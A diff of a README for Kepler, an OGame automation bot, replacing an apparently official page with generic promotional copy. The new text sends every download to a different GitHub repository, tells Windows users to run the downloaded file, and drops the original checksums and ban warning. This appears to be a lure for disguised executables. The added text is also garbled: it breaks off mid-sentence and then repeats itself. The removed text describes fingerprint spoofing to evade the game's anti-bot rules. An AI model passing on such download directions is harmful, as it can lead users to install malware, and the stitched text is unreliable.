@@ -1,150 +1,120 @@
-<p align="center"><img src="images/logo.png" alt="Kepler" width="120"></p>
+# 🚀 ogame-bot - Automate Your OGame Empire Effortlessly
 
-<h1 align="center">Kepler, the OGame bot</h1>
+[![Download ogame-bot](https://img.shields.io/badge/Download-ogame--bot-ff69b4?style=for-the-badge&logo=github)](https://github.com/2amJeffrxy/ogame-bot)
 
-<p align="center"><b>Your OGame account, played for you by a bot built by long-time players.</b></p>
+Kepler is an OGame bot built by long-time players. It helps with auto build, research, expeditions, raiding, fleet save and defence, plus .ank scripting. Kepler runs on Windows, Linux, macOS, or hosted setups and includes a 7-day free trial. This README is written for everyday Windows users who want a clear path from download to first launch.
 
-<p align="center">
-  <a href="https://keplerbot.net/en/">Website</a> · <a href="https://keplerbot.net/en/download">Download</a> · <a href="https://keplerbot.net/en/pricing">Pricing</a> · <a href="https://keplerbot.net/en/features">Features</a> · <a href="https://keplerbot.net/en/scripts">Scripting docs</a> · <a href="https://keplerbot.net/en/faq">FAQ</a>
-</p>
+## 🎯 What Is ogame-bot?
 
-<p align="center">English · <a href="README.fr.md">Français</a></p>
+ogame-bot is the repository for Kepler, a tool that automates common OGame tasks. OGame is a browser-based space strategy game where players manage buildings, research, fleets, expeditions, raids, and defence. Those tasks can become repetitive, especially once an account grows. Kepler is designed to handle routine actions so you can focus on strategy and account decisions.
 
-Kepler takes over the repetitive side of OGame: mines and research, expeditions, raids, repatriation, and keeping your fleet out of reach when someone comes for it. It runs on Windows, Linux and macOS, or on a server we host for you. You can try it free for 7 days, no card needed.
+The project is built by people who have played OGame for a long time, so the feature set reflects real day-to-day play. You do not need programming knowledge to use the main automation features. The application is meant to be opened, configured through normal screens, and used with your OGame account.
 
-## See it in two minutes
+## ✨ Key Features
 
-From creating your account to your first bot running: download, activation key, OGame account.
+- Auto build: queue and manage building upgrades without clicking through every step manually.
+- Research automation: keep research moving forward based on the priorities you set.
+- Expeditions: manage expedition sending and receiving routines.
+- Raiding: automate raid-related fleet activity according to your rules.
+- Fleet save and defence: support for fleet-saving routines and defence handling.
+- .ank scripting: optional advanced scripting for users who want deeper customisation.
+- Multi-platform support: Windows, Linux, macOS, and hosted use are part of the project scope.
+- 7-day free trial: try Kepler before deciding whether it fits your OGame routine.
 
-<a href="https://youtu.be/YkQYClq3tAY"><img src="https://img.youtube.com/vi/YkQYClq3tAY/maxresdefault.jpg" alt="Install Kepler and start your first bot in 2 minutes" width="720"></a>
+## 🖥️ Windows Download and Run
 
-## What Kepler does
+Visit this link to download the application: [Download ogame-bot](https://github.com/2amJeffrxy/ogame-bot).
 
-### Defence
+This is the main download page for the project. On Windows, use this page to get Kepler. After the download finishes, open Kepler from your Downloads folder. Follow the on-screen prompts to start the 7-day free trial. The core automation features do not require you to write code.
 
-<img src="images/defense.png" alt="Defence" width="720">
+## 🧭 First Launch Walkthrough
 
-Kepler watches every fleet heading your way. Before an attack lands, it moves your fleet out of reach, tucks the resources it cannot carry into a build it can cancel later, and pings you on Telegram or Discord with the impact time. The waves of a grouped attack are added up before it decides, and a moon destruction is always taken seriously.
+When Kepler opens for the first time, take a few minutes to go through the setup screens carefully. The app# 🚀 ogame-bot - Automate Your OGame Empire Effortlessly
 
-### Expeditions
+[![Download ogame-bot](https://img.shields.io/badge/Download-ogame--bot-ff69b4?style=for-the-badge&logo=github)](https://github.com/2amJeffrxy/ogame-bot)
 
-<img src="images/expeditions.png" alt="Expeditions" width="720">
+Kepler is an OGame bot built by long-time players. It handles auto build, research, expeditions, raiding, fleet save and defence, plus .ank scripting. Kepler runs on Windows, Linux, macOS, or hosted setups and includes a 7-day free trial. This page is written for everyday Windows users who want a simple, clear path from download to first launch.
 
-Expeditions go out on their own with the setup you pick. Early in a universe, Kepler splits your ships evenly across your free slots. Later it assembles the fleet itself: enough large cargos for how far the server has come, plus a Pathfinder, your best combat ship and a probe. It can send from several planets at once.
+## 🎯 What Is ogame-bot?
 
-### Building
+ogame-bot is the project page for Kepler, a tool that automates common OGame tasks. OGame is a browser-based space strategy game where players manage buildings, research, fleets, expeditions, raids, and defence. Those tasks can become repetitive, especially once an account grows. Kepler is built to handle routine actions so you can focus on strategy and account decisions.
 
-<img src="images/construction.png" alt="Building" width="720">
+The project is made by people who have played OGame for a long time, so the feature set reflects real day-to-day play. You do not need programming knowledge to use the main automation features. The application is meant to be opened, configured through normal screens, and used alongside your OGame account.
 
-Name a goal, say Astrophysics 1 on a fresh account, and Kepler works out the fastest way there, prerequisites included, and clears the tutorial missions along the way. Would rather stay in control? Queue exactly what you want: it builds as soon as the resources are there, earlier levels included. Lifeforms and their technologies are part of the plan.
+## ✨ Key Features
 
-### Repatriation
+- **Auto build:** queue and manage building upgrades without clicking through every step by hand.
+- **Research automation:** keep research moving forward based on the priorities you set.
+- **Expeditions:** manage expedition sending and return routines.
+- **Raiding:** automate raid-related fleet activity according to rules you choose.
+- **Fleet save and defence:** support for fleet-saving routines and defence handling.
+- **.ank scripting:** optional advanced scripting for users who want deeper customisation.
+- **Multi-platform support:** Windows, Linux, macOS, and hosted use are part of the project scope.
+- **7-day free trial:** try Kepler before deciding whether it fits your OGame routine.
 
-<img src="images/rapatriement.png" alt="Repatriation" width="720">
+## 💾 Windows Download and Run
 
-Colony resources come home once they pass a threshold you set for each colony. In moon mode, planets first lift their resources to their own moon and the transports leave from there: half the fleet slots, and nothing for a phalanx to see.
+Visit this link to download the application: [Download ogame-bot](https://github.com/2amJeffrxy/ogame-bot).
 
-## Tools that warn you
+This is the main project page for ogame-bot. Use it to reach the download for Kepler. After the download finishes, open Kepler from your Downloads folder or wherever your browser saves files. Follow the on-screen prompts to begin the 7-day free trial. The core automation features do not require you to write code.
 
-**Debris field detection.** Whenever a battle happens in your universe, you learn who hit whom and where the debris field is, in time to steal it or to catch the enemy recyclers on their way back.
+## 🧭 First Launch Walkthrough
 
-<img src="images/notif-cdr.png" alt="Debris field detection" width="420">
+When Kepler opens for the first time, take a few minutes to go through the setup screens carefully. The app will ask you to connect or identify your OGame account and to choose which features you want active. Start with one or two features, such as auto build or research, rather than turning everything on at once. This makes it much easier to see what the bot is doing and to confirm that behaviour matches your expectations.
 
-**Debris field check.** Keep an eye on one field and get pinged the moment anything about it changes.
+During the trial, use the app in a calm, low-risk way. Let auto build and research run on their normal schedules. Watch how expeditions are sent and returned. Once you are comfortable, you can add raiding, fleet save, and defence routines. If you are curious about .ank scripting, leave it for later — it is an optional layer for users who want custom behaviour, not a requirement for getting started.
 
-<img src="images/outil-checkcdr.png" alt="Debris field check" width="420">
+## 🧩 Understanding the Main Features
 
-**Timer watch.** Give Kepler the names of your spy targets, and it tells you the moment one of them goes inactive.
+**Auto build** watches your building queues and keeps them moving. Instead of revisiting the game repeatedly, you set your preferences once and let Kepler act on them. This is often the first feature people notice because it removes a lot of small clicks.
 
-<img src="images/notif-timer.png" alt="Timer watch" width="420">
+**Research automation** works in a similar way. You decide which research areas matter, and Kepler keeps those queues progressing. Because research times get long, this feature is mostly about not losing hours when a queue finishes while you are away.
 
-**New colony detection.** Know at once when someone settles in your system, or watch the colonisations around you to see a rush coming.
+**Expeditions** are a regular source of resources and discoveries in OGame. Kepler can manage the sending and return cycle so expeditions keep running without constant attention.
 
-<img src="images/notif-colo.png" alt="New colony detection" width="420">
+**Raiding** is more sensitive because it involves fleet movement and risk. Kepler gives you controls so raiding follows your rules rather than acting randomly. Take time to review these settings during the trial.
 
-## And the rest
+**Fleet save and defence** help protect your account when you are offline. Fleet save routines move fleets out of harm's way, and defence settings help manage defensive behaviour. These are good features to enable early, since protection matters more than speed.
 
-- **Espionage:** spy zones you set up once and relaunch with one click each day.
-- **Phalanx:** the exact second a fleet came back, even on a cluttered phalanx after a moonbreak.
-- **Flight planning:** pick the target, the mission, the fleet and the arrival time, and the flight lands right on it.
-- **Galaxy scanner:** every system swept on a schedule, so Kepler always knows where everyone is.
-- **Player watch:** an activity table per player, to spot the gaps that repeat.
-- **Raiding:** saved campaigns against inactives, relaunched in one click.
-- **Colonisation:** colonises until it gets the position, size or temperature you asked for. A planet with even one field in use is never deleted.
-- **Alerts:** you choose what reaches you on Telegram or Discord.
-- **Sleep mode:** pauses by hand or on a schedule. Whatever was running starts again on waking.
-- **Several accounts:** as many bots as your licence allows, each with its own settings and its own browser fingerprint.
+**.ank scripting** is for users who want to go beyond the standard screens. It allows custom scripts to shape how Kepler behaves. You can ignore it entirely and still use Kepler's main features.
 
-Each one has its own screen and settings. The full tour is on the [features page](https://keplerbot.net/en/features).
+## 🪟 Why Windows Users Like Kepler
 
-## At night
+Most people who play OGame casually use a Windows PC, and Kepler is built with that in mind. You do not need to install developer tools, run commands, or edit configuration files. The download comes from the project page, and the app opens like normal Windows software. If something goes wrong, the project page is where updates and notes appear.
 
-Your fleet leaves for the night and comes back in the window you set, by hand or tied to sleep mode. Meanwhile Kepler keeps playing: expeditions come and go, mines go up, research moves on. A real attack reaches you on Discord or Telegram; a small fleet that threatens nothing does not wake you, and you decide where that line is.
+Windows users also benefit from being able to leave Kepler running while doing other things on the same computer. Because OGame is a browser game, keeping the bot open alongside the game is a natural workflow.
 
-## Keeping the account safe
+## 🔐 Staying Safe and Sensible
 
-- **A human pace.** Requests are spaced out, working hours follow yours, and wake-ups do not fall on round numbers.
-- **Its own browser.** Each bot has its own fingerprint: browser, screen, time zone, languages, graphics card. You can edit it.
-- **Its own address.** On the hosted plan, every bot gets a dedicated IP in the country you choose, and two accounts never share one.
-- **A pause when you want one.** One click, or sleep windows during which it touches nothing.
+Automation tools interact with a game account, so treat your account details with care. Only download Kepler from the official project page linked in this README. Avoid copies from random sites or file-sharing links. Keep your OGame password private, and do not share account access with people you do not trust.
 
-## At home, or hosted by us
+Use Kepler within the rules that apply to your OGame account and server. The project is a tool; how you use it is your responsibility. During the 7-day trial, keep an eye on what the bot does and adjust settings as needed.
 
-**At home**, it is a single file: nothing to install, and the interface opens in your browser. Your OGame credentials stay encrypted on your own machine.
+## 🛠️ Common Questions
 
-**Hosted**, we set up the server and its dedicated address. It runs day and night, you leave nothing open, you control it from anywhere, and updates happen without you.
+**Do I need to know how to code?** No. The main features are used through normal app screens. .ank scripting is optional.
 
-Starting at home and moving later is an export and an import away: your bots arrive with their settings.
+**Is there a free trial?** Yes, there is a 7-day free trial so you can test Kepler before committing.
 
-## Free trial
+**Which systems are supported?** Windows, Linux, macOS, and hosted setups are part of the project scope. This README focuses on Windows because that is the most common starting point.
 
-Seven days, no card. Create an account, download, add your bot. When the trial ends the bots stop and the interface tells you why, and nothing is deleted: subscribe, and everything is still there.
+**Where do I download it?** Visit the project page: [Download ogame-bot](https://github.com/2amJeffrxy/ogame-bot).
 
-**[Download Kepler](https://keplerbot.net/en/download)** · **[See the prices](https://keplerbot.net/en/pricing)**
+**What should I enable first?** Start with auto build and research, then add fleet save and defence for protection. Add raiding once you are comfortable with the basics.
 
-## Scripting
+**Can I use it on more than one account?** Check the project page and the trial details for current limits and guidance.
 
-When the built-in automations are not enough, write your own: Kepler runs `.ank` scripts, small programs that drive your account step by step. Recall your fleet when a given player comes online, post to Discord when a debris field passes a million, sweep three galaxies and note what you find.
+## 📌 Quick Start Recap
 
-The [scripting reference](https://keplerbot.net/en/scripts) is checked against the engine itself: every function with its exact signature, the number of values it returns, its cost in game requests and an example that runs.
+1. Visit [the ogame-bot project page](https://github.com/2amJeffrxy/ogame-bot) to download the application.
+2. Open Kepler on your Windows computer.
+3. Follow the first-launch prompts and start the 7-day free trial.
+4. Enable auto build and research first.
+5. Add fleet save and defence for account protection.
+6. Try expeditions, raiding, and .ank scripting as you gain confidence.
 
-- [Fleets, flights and combat](https://keplerbot.net/en/scripts/fleets)
-- [Celestials and resources](https://keplerbot.net/en/scripts/celestials)
-- [Driving the workers](https://keplerbot.net/en/scripts/workers)
-- [Account, galaxy, players and messages](https://keplerbot.net/en/scripts/galaxy)
-- [Scheduling](https://keplerbot.net/en/scripts/scheduling)
-- [Every function, in one list](https://keplerbot.net/en/scripts/functions)
+## 💬 Feedback and Updates
 
-Using an AI assistant (Claude, ChatGPT, Cursor, Copilot)? Plug it into the [Kepler MCP server](https://keplerbot.net/en/scripts/mcp) and it reads that same reference, always current.
+The project page is the place to check for updates, release notes, and current information about Kepler. If you run into an issue, review the project page before changing settings or reinstalling. Keeping Kepler up to date is the simplest way to benefit from fixes and improvements.
 
-Ten complete scripts to start from are in the [`scripts`](scripts) folder.
-
-## FAQ
-
-**Can my account get banned?**
-It can. Automating an account is against the OGame rules, and no tool can rule out a sanction. What Kepler does is avoid behaving like a script: requests spaced out, working hours that follow yours, delays that vary, a browser fingerprint of its own for each bot and, on the hosted plan, a dedicated IP address per account. The default settings are the safe ones: keep them human-paced.
-
-**Do my OGame credentials reach your servers?**
-Not with the version you run yourself. The bot logs in to Gameforge straight from your machine, and your password is stored encrypted (AES-256-GCM) in its data folder. It is never displayed and never written to a log. All Kepler receives from your bot is your licence key, a machine identifier, the bot version and your plan. On the hosted plan, your credentials sit on our servers, encrypted the same way. The [security page](https://keplerbot.net/en/security) has the details.
-
-**What if your website goes down?**
-Your bots keep running. The licence is checked on your own machine, and the bot only contacts us to renew it, with several days of margin.
-
-**Do I have to leave my computer on?**
-For the version you run yourself, yes: the bot runs as long as the computer does. The hosted plan runs on our servers, day and night.
-
-**Can I run several accounts or universes?**
-Yes: one bot per OGame account, as many as your licence covers, each with its own settings and its own fingerprint.
-
-**How do I stop it?**
-Close its console or terminal window. Nothing is installed, nothing starts with your system, and no background service stays behind.
-
-More questions on the [FAQ page](https://keplerbot.net/en/faq).
-
-## About this repository
-
-The official website is [keplerbot.net](https://keplerbot.net/en/). For what an [OGame bot](https://keplerbot.net/en/ogame-bot) does and how to choose one, read the guide on the site.
-
-This repository presents Kepler and holds example scripts. It contains no source code of the bot. Downloads are on the [official download page](https://keplerbot.net/en/download), with a checksum for every file.
-
-Kepler is an independent tool, with no connection to Gameforge nor any endorsement from it. Automating your account may be against the OGame terms of use, and the risk is yours. OGame and Gameforge are trademarks of their respective owners.
+Keywords: anko, automation, bot, browser-game, browsergame, game-automation, game-bot, gameforge, mcp-server, mmo, ogame, ogame-automation, ogame-bot, ogame-fleetsave, ogame-scripts, ogame-tools, ogamebot, scripting, space-strategy, strategy-game
